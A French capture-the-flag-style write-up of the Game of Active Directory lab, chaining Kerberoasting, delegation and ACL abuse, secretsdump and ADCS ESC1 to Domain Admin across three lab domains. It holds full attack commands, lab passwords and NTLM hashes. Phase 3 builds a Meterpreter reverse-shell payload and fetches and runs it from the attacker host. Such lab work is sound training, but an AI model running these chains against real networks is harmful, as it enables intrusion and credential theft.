# GOAD — Write-Up (Game of Active Directory)

> Lab de pentest basé sur l'environnement Game of Active Directory (GOAD).  
> Trois domaines, trois contrôleurs de domaine, plusieurs chemins d'attaque depuis la reconnaissance initiale jusqu'à la compromission complète en Domain Admin.

---

## Table des matières

- [Réseau et infrastructure](#réseau-et-infrastructure)
- [Récapitulatif des credentials](#récapitulatif-des-credentials)
- [Phase 1 — De la reconnaissance initiale à Domain Admin (north.sevenkingdoms.local)](#phase-1--de-la-reconnaissance-initiale-à-domain-admin-northsevenkingdomslocal)
- [Phase 2 — De Tywin.Lannister à Domain Admin (sevenkingdoms.local / KINGSLANDING)](#phase-2--de-tywinlannister-à-domain-admin-sevenkingdomslocal--kingslanding)
- [Phase 3 — De KINGSLANDING vers BRAAVOS puis MEEREEN (essos.local)](#phase-3--de-kingslanding-vers-braavos-puis-meereen-essoslocal)

---

## Réseau et infrastructure

| Adresse IP   | Noms d'hôte                                                                 | Rôle      |
|--------------|-----------------------------------------------------------------------------|-----------|
| 10.3.10.249  | kali                                                                        | Attaquant |
| 10.3.10.10   | sevenkingdoms.local, kingslanding.sevenkingdoms.local, kingslanding         | DC01      |
| 10.3.10.11   | winterfell.north.sevenkingdoms.local, north.sevenkingdoms.local, winterfell | DC02      |
| 10.3.10.12   | essos.local, meereen.essos.local, meereen                                   | DC03      |
| 10.3.10.22   | castelblack.north.sevenkingdoms.local, castelblack                          | SRV02     |
| 10.3.10.23   | braavos.essos.local, braavos                                                | SRV03     |

---

## Récapitulatif des credentials

| Utilisateur       | Mot de passe                   | Domaine / Remarques                                       |
|-------------------|--------------------------------|-----------------------------------------------------------|
| samwell.tarly     | Heartsbane                     | north.sevenkingdoms.local — trouvé via enum4linux         |
| jon.snow          | iknownothing                   | north.sevenkingdoms.local — trouvé via Kerberoasting      |
| brandon.stark     | iseedeadpeople                 | north.sevenkingdoms.local                                 |
| arya.stark        | Needle                         | north.sevenkingdoms.local                                 |
| robb.stark        | sexywolfy                      | north.sevenkingdoms.local                                 |
| hodor             | hodor                          | north.sevenkingdoms.local                                 |
| jeor.mormont      | _L0ngCl@w_                     | north.sevenkingdoms.local — trouvé dans SYSVOL/script.ps1 |
| tywin.lannister   | powerkingftw135                | sevenkingdoms.local — déchiffré depuis SYSVOL/secret.ps1  |
| jaime.lannister   | WinterIsComing123!             | sevenkingdoms.local — mot de passe défini via rpcclient   |
| joffrey.baratheon | 1killerlion                    | sevenkingdoms.local — cracké via hashcat                  |
| tyron.lannister   | LannisterIsComming123!         | sevenkingdoms.local — mot de passe défini via rpcclient   |
| stannis.baratheon | BaratheonIsComming123!         | sevenkingdoms.local — mot de passe défini via rpcclient   |
| sql_svc           | YouWillNotKerboroast1ngMeeeeee | essos.local — récupéré via dump LSA                       |

---

## Ressources utilisées
- https://orange-cyberdefense.github.io/ocd-mindmaps/img/mindmap_ad_dark_classic_2025.03.excalidraw.svg
- https://orange-cyberdefense.github.io/GOAD/labs/GOAD/
- BloodHound

---

## Phase 1 — De la reconnaissance initiale à Domain Admin (north.sevenkingdoms.local)

### 1. Reconnaissance initiale

```bash
nmap -sC -sV 10.3.10.11
```

Résultat : contrôleur de domaine Windows avec SMB, LDAP et Kerberos exposés.

---

### 2. Énumération SMB

```bash
enum4linux 10.3.10.11
```

Résultat clé : le champ description du compte contient directement les credentials.

```
Desc: Samwell Tarly (Password : Heartsbane)
```

---

### 3. Collecte BloodHound

```bash
bloodhound-python -d north.sevenkingdoms.local \
  -u samwell.tarly -p 'Heartsbane' \
  -c All -ns 10.3.10.11 --zip
```

Permet de cartographier les droits Active Directory et d'identifier les chemins d'attaque.

---

### 4. Synchronisation de l'heure (obligatoire pour Kerberos)

```bash
sudo ntpdate -u 10.3.10.11
```

---

### 5. Kerberoasting

```bash
impacket-GetUserSPNs north.sevenkingdoms.local/samwell.tarly:Heartsbane \
  -dc-ip 10.3.10.11 -request > hashes.txt
```

---

### 6. Crackage du hash

```bash
tar -xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz

john --wordlist=rockyou.txt hashes.txt --format=krb5tgs
john --show hashes.txt
```

Mot de passe trouvé : `iknownothing`

---

### 7. Spray de credentials

```bash
crackmapexec smb 10.3.10.11 \
  -u sansa.stark jon.snow sql_svc \
  -p 'iknownothing'
```

Compte valide identifié : `jon.snow`

---

### 8. Recherche de délégation

```bash
impacket-findDelegation \
  north.sevenkingdoms.local/jon.snow:iknownothing \
  -dc-ip 10.3.10.11
```

Résultat : Constrained Delegation trouvée et exploitable.

---

### 9. Exploitation de la délégation (attaque S4U)

```bash
impacket-getST \
  -spn CIFS/winterfell.north.sevenkingdoms.local \
  -impersonate Administrator \
  north.sevenkingdoms.local/jon.snow:iknownothing \
  -dc-ip 10.3.10.11
```

---

### 10. Chargement du ticket Kerberos

```bash
export KRB5CCNAME=Administrator.ccache
klist
```

---

### 11. Accès en tant qu'Administrator via PsExec

```bash
impacket-psexec -k -no-pass \
  north.sevenkingdoms.local/Administrator@winterfell.north.sevenkingdoms.local
```

Shell SYSTEM obtenu.

---

### 12. Dump des secrets

```bash
impacket-secretsdump north.sevenkingdoms.local/Administrator@10.3.10.11 \
  -hashes :dbd13e1c4e338284ac4e9874f7de6ef4 > SAM-WINTERFELL.txt
```

---

### 13. BloodHound avec le hash admin

```bash
bloodhound-python -d north.sevenkingdoms.local \
  -u Administrator \
  --hashes :<NTLM_HASH> \
  -ns 10.3.10.11 \
  -c All --zip
```

---

### 14. Énumération du SYSVOL

```bash
crackmapexec smb 10.3.10.11 \
  -u Administrator -H :dbd13e1c4e338284ac4e9874f7de6ef4 \
  --spider SYSVOL --pattern .ps1
```

Deux scripts trouvés dans le SYSVOL :

```
//10.3.10.11/SYSVOL/north.sevenkingdoms.local/scripts/script.ps1
//10.3.10.11/SYSVOL/north.sevenkingdoms.local/scripts/secret.ps1
```

Téléchargement via smbclient :

```bash
impacket-smbclient north.sevenkingdoms.local/Administrator@10.3.10.11 \
  -hashes :dbd13e1c4e338284ac4e9874f7de6ef4

# Dans smbclient :
use SYSVOL
cd north.sevenkingdoms.local/scripts
get script.ps1
get secret.ps1
```

- `script.ps1` contient les credentials de `jeor.mormont` avec le mot de passe `_L0ngCl@w_`
- `secret.ps1` contient une SecureString chiffrée déchiffrable grâce à une clé codée en dur

Script de déchiffrement (`decrypt.ps1`), exécuté en local pour récupérer le mot de passe de `tywin.lannister` :

```powershell
$key = 177,252,228,64,28,91,12,201,20,91,21,139,255,65,9,247,41,55,164,28,75,132,143,71,62,191,211,61,154,61,216,91

$secure = ConvertTo-SecureString "76492d1116743f0423413b16050a5345MgB8AGkAcwBDACsAUwArADIAcABRAEcARABnAGYAMwA3AEEAcgBFAEIAYQB2AEEAPQA9AHwAZQAwADgANAA2ADQAMABiADYANAAwADYANgA1ADcANgAxAGIAMQBhAGQANQBlAGYAYQBiADQAYQA2ADkAZgBlAGQAMQAzADAANQAyADUAMgAyADYANAA3ADAAZABiAGEAOAA0AGUAOQBkAGMAZABmAGEANAAyADkAZgAyADIAMwA=" -Key $key

$ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
[System.Runtime.InteropServices.Marshal]::PtrToStringAuto($ptr)
```

Mot de passe récupéré : `powerkingftw135`

---

## Phase 2 — De Tywin.Lannister à Domain Admin (sevenkingdoms.local / KINGSLANDING)

### 1. Énumération du domaine

```bash
rpcclient -U "tywin.lannister" -N 10.3.10.10 -c "enumdomusers"
rpcclient -U "tywin.lannister" -N 10.3.10.10 -c "enumdomgroups"

crackmapexec smb 10.3.10.10 -u "tywin.lannister" -p "powerkingftw135" --rid-brute 10000

bloodhound-python -d sevenkingdoms.local -u tywin.lannister -p 'powerkingftw135' \
  -c All -ns 10.3.10.10 --zip
```

---

### 2. Kerberoasting sur sevenkingdoms.local

```bash
impacket-GetUserSPNs sevenkingdoms.local/tywin.lannister:powerkingftw135 \
  -dc-ip 10.3.10.10 -request
```

---

### 3. Réinitialisation du mot de passe — jaime.lannister

Exploitation des droits en écriture de tywin.lannister :

```bash
rpcclient -U "sevenkingdoms.local\\tywin.lannister%powerkingftw135" 10.3.10.10
setuserinfo2 jaime.lannister 23 WinterIsComing123!
```

---

### 4. Targeted Kerberoasting — joffrey.baratheon

```bash
ntpdate 10.3.10.10

targetedKerberoast/targetedKerberoast.py -d sevenkingdoms.local \
  -u jaime.lannister -p WinterIsComing123!
```

Crackage du hash :

```bash
hashcat -m 13100 -a 0 joffrey.txt rockyou.txt
hashcat -m 13100 joffrey.txt --show
```

Mot de passe trouvé : `1killerlion`

---

### 5. Abus d'ACL — FullControl sur tyron.lannister

```bash
impacket-dacledit \
  sevenkingdoms.local/joffrey.baratheon:'1killerlion' \
  -target tyron.lannister \
  -principal joffrey.baratheon \
  -rights FullControl \
  -action write \
  -dc-ip 10.3.10.10
```

Définition du mot de passe de `tyron.lannister` :

```bash
rpcclient -U "sevenkingdoms.local\\joffrey.baratheon%1killerlion" 10.3.10.10
setuserinfo2 tyron.lannister 23 LannisterIsComming123!
```

---

### 6. Escalade via appartenance aux groupes

```bash
# Ajout au groupe Small Council
bloodyAD --host 10.3.10.10 -d sevenkingdoms.local \
  -u tyron.lannister -p 'LannisterIsComming123!' \
  add groupMember "Small Council" tyron.lannister

# Ajout au groupe DragonStone
bloodyAD --host 10.3.10.10 -d sevenkingdoms.local \
  -u tyron.lannister -p 'LannisterIsComming123!' \
  add groupMember "DragonStone" tyron.lannister
```

---

### 7. Prise de propriété du groupe KingsGuard

```bash
impacket-owneredit \
  sevenkingdoms.local/tyron.lannister:'LannisterIsComming123!' \
  -target KingsGuard \
  -new-owner tyron.lannister \
  -action write \
  -dc-ip 10.3.10.10

impacket-dacledit \
  sevenkingdoms.local/tyron.lannister:'LannisterIsComming123!' \
  -target KingsGuard \
  -principal tyron.lannister \
  -rights FullControl \
  -action write \
  -dc-ip 10.3.10.10

bloodyAD --host 10.3.10.10 -d sevenkingdoms.local \
  -u tyron.lannister -p 'LannisterIsComming123!' \
  add groupMember KingsGuard tyron.lannister
```

---

### 8. Réinitialisation du mot de passe — stannis.baratheon

```bash
rpcclient -U 'sevenkingdoms.local\\tyron.lannister%LannisterIsComming123!' 10.3.10.10
setuserinfo2 stannis.baratheon 23 BaratheonIsComming123!
```

---

### 9. Attaque RBCD — Compromission de KINGSLANDING

Création d'un faux compte machine :

```bash
impacket-addcomputer \
  sevenkingdoms.local/stannis.baratheon:BaratheonIsComming123! \
  -computer-name ATTACKER$ \
  -computer-pass Attack123! \
  -dc-ip 10.3.10.10
```

Configuration du RBCD (Resource-Based Constrained Delegation) :

```bash
impacket-rbcd \
  sevenkingdoms.local/stannis.baratheon:BaratheonIsComming123! \
  -action write \
  -delegate-from ATTACKER$ \
  -delegate-to KINGSLANDING$ \
  -dc-ip 10.3.10.10
```

Demande d'un ticket de service en usurpant l'identité d'Administrator :

```bash
impacket-getST \
  sevenkingdoms.local/ATTACKER$:Attack123! \
  -spn cifs/KINGSLANDING.sevenkingdoms.local \
  -impersonate Administrator \
  -dc-ip 10.3.10.10
```

---

### 10. PsExec en tant qu'Administrator sur KINGSLANDING

```bash
export KRB5CCNAME=Administrator@cifs_KINGSLANDING.sevenkingdoms.local@SEVENKINGDOMS.LOCAL.ccache
impacket-psexec -k -no-pass KINGSLANDING.sevenkingdoms.local
```

---

### 11. Dump des secrets

```bash
impacket-secretsdump north.sevenkingdoms.local/robb.stark:sexywolfy@10.3.10.11 > SAM-WINTERFELL.txt
impacket-secretsdump -k -no-pass KINGSLANDING.sevenkingdoms.local > SAM-Kingslanding.txt
```

---

## Phase 3 — De KINGSLANDING vers BRAAVOS puis MEEREEN (essos.local)

### 1. Attaque RBCD — Compromission de BRAAVOS

Création d'un faux compte machine dans le contexte essos.local :

```bash
impacket-addcomputer \
  sevenkingdoms.local/tyron.lannister:LannisterIsComming123! \
  -computer-name ATTACKER_MEEREN$ \
  -computer-pass Attack123! \
  -dc-ip 10.3.10.12
```

Configuration du RBCD ciblant BRAAVOS :

```bash
impacket-rbcd \
  sevenkingdoms.local/tyron.lannister:LannisterIsComming123! \
  -action write \
  -delegate-from ATTACKER_MEEREN$ \
  -delegate-to BRAAVOS$ \
  -dc-ip 10.3.10.12
```

Synchronisation de l'heure et demande du ticket :

```bash
ntpdate 10.3.10.12

impacket-getST \
  essos.local/ATTACKER_MEEREN$:Attack123! \
  -spn cifs/BRAAVOS.essos.local \
  -impersonate Administrator \
  -dc-ip 10.3.10.12
```

---

### 2. PsExec sur BRAAVOS et dump des secrets

```bash
export KRB5CCNAME=Administrator@cifs_BRAAVOS.essos.local@ESSOS.LOCAL.ccache
impacket-psexec -k -no-pass BRAAVOS.essos.local
impacket-secretsdump -k -no-pass BRAAVOS.essos.local > SAM-Braavos.txt
```

---

### 3. Payload Meterpreter — Extraction des secrets LSA

Génération et mise à disposition du payload depuis la machine attaquante :

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.3.10.249 LPORT=4444 -f exe -o shell.exe

python3 -m http.server 80
```

Mise en place du listener :

```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.3.10.249
set LPORT 4444
run
```

Téléchargement et exécution du payload sur BRAAVOS (via la session psexec existante) :

```bash
curl http://10.3.10.249/shell.exe -o %TEMP%/shell.exe
%TEMP%/shell.exe
```

Une fois la session Meterpreter établie, l'exécution de `lsa_dump_secrets` permet de récupérer les credentials de `sql_svc` :

```
sql_svc : YouWillNotKerboroast1ngMeeeeee
```

---

### 4. ESC1 — Abus de certificats ADCS (élévation de privilèges vers MEEREEN Admin)

Récupération du SID de l'Administrator :

```bash
rpcclient -U sql_svc%YouWillNotKerboroast1ngMeeeeee 10.3.10.12
lookupnames Administrator
# Administrator S-1-5-21-3032822006-1789175315-2555738685-500
```

Demande d'un certificat via le template vulnérable ESC1, en usurpant l'identité d'Administrator :

```bash
certipy-ad req \
  -u sql_svc -p 'YouWillNotKerboroast1ngMeeeeee' \
  -dc-ip 10.3.10.12 \
  -template ESC1 \
  -upn administrator@essos.local \
  -target 10.3.10.23 \
  -out admin_meeren \
  -ca ESSOS-CA \
  -sid S-1-5-21-3032822006-1789175315-2555738685-500
```

Authentification avec le certificat et récupération du hash NTLM :

```bash
certipy-ad auth \
  -u administrator \
  -domain essos.local \
  -dc-ip 10.3.10.12 \
  -pfx admin_meeren.pfx
```

Hash NTLM de l'Administrator récupéré :

```
aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da
```

---

### 5. Dump complet du domaine essos.local

```bash
impacket-secretsdump \
  -hashes aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da \
  ESSOS.local > SAM-ESSOS.txt
```

---

*Compromission complète des trois domaines obtenue : north.sevenkingdoms.local, sevenkingdoms.local, essos.local.*
